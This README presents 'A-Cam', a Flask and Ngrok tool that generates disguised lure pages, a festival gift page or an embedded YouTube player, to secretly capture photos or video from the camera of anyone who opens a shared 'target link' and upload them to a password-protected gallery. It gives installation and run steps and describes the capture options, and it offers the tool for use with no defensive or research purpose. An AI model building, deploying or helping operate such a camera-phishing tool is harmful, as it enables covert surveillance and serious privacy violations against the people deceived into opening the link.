# 🎁 A-Cam: Gift Media Receiver & Private Gallery

A lightweight, feature-rich web server tool designed to generate customized interactive web pages (Festival Gifts or YouTube Videos) and receive uploaded media directly via Ngrok HTTPS tunnels. Features a password-protected live online gallery for managing received photos and videos.

---

## 🌟 Key Features

* 🎊 **Festival Surprise Mode**: Customizable gift page with festival name and celebratory confetti.
* 🎬 **YouTube Video Mode**: Hidden media receiver embedded within a YouTube video player.
* 📸 **Flexible Capture Modes**: Custom duration video recording or multi-photo capture setup.
* 🔐 **Private Protected Gallery**: Login protection for the `/gallery` interface and media endpoints (`/view`, `/download`, `/delete`) using HTTP Basic Authentication.
* 📁 **Local Storage**: Automatically organizes all uploaded media in the `captured_media/` directory.
* 🌐 **Ngrok Public Tunnels**: Instantly generates public HTTPS links for remote sharing.

---

## 📦 Requirements

* Linux (Parrot OS, Ubuntu, Debian) or macOS / Windows
* Python 3.8+
* [Ngrok](https://ngrok.com/download)

---

## 🚀 Installation & Setup

### 1. Make Scripts Executable & Run Installer
```bash
chmod +x install.sh run.sh
./install.sh
```

### 2. Configure Ngrok Authtoken (If Not Already Configured)
Get your free authtoken from [dashboard.ngrok.com](https://dashboard.ngrok.com/get-started/your-authtoken):
```bash
ngrok config add-authtoken YOUR_AUTHTOKEN_HERE
```

---

## 🎮 How to Run

Launch the server with a single command:
```bash
./run.sh
```
*(Or directly: `python3 server.py`)*

---

## 📋 Interactive Setup Steps

When launching `./run.sh`, the terminal will guide you through:

1. **Ngrok Token Check**: Uses saved token or prompts for a new authtoken.
2. **Select Target Mode**:
   * `1` — **Festival Mode** (Gift unwrapping page)
   * `2` — **YouTube Mode** (YouTube video page)
3. **Select Camera Type**:
   * `1` — **Front Camera** (`user`)
   * `2` — **Back Camera** (`environment`)
4. **Select Capture Mode**:
   * `1` — **Video** (Set duration in seconds, default: 15s)
   * `2` — **Photo** (Set number of photos, default: 5 photos)
5. **Customize Content**:
   * Festival Name or YouTube Video URL/ID
6. **Set Gallery Credentials**:
   * Set custom Username (default: `admin`)
   * Set custom Password (default: `admin123`)

---

## 📤 Output & Links

After configuration, the server prints your links:

* **Shareable Target Link**:
  `🔗 https://<your-ngrok-subdomain>.ngrok-free.app/festival?name=Surprise...`
* **Private Gallery (Online)**:
  `🔗 https://<your-ngrok-subdomain>.ngrok-free.app/gallery`
* **Private Gallery (Local)**:
  `🏠 http://localhost:5000/gallery`
* **Login Credentials**:
  `Username: admin | Password: admin123`

---

## 📁 File Structure

```text
A-Cam/
├── server.py         # Main Flask server & Ngrok launcher
├── festival.html     # Festival surprise page template
├── youtube.html      # YouTube player template
├── install.sh        # Dependency installation script
├── run.sh            # One-click launcher script
├── captured_media/   # Directory storing all received photos & videos
└── README.md         # Documentation
```

---

## ⚠️ Troubleshooting

* **Ngrok Start Issues**: Run `pkill ngrok` in your terminal to close stale background processes before running `./run.sh`.
* **Login Protection**: Enter the exact Username and Password specified during terminal startup when opening `/gallery`.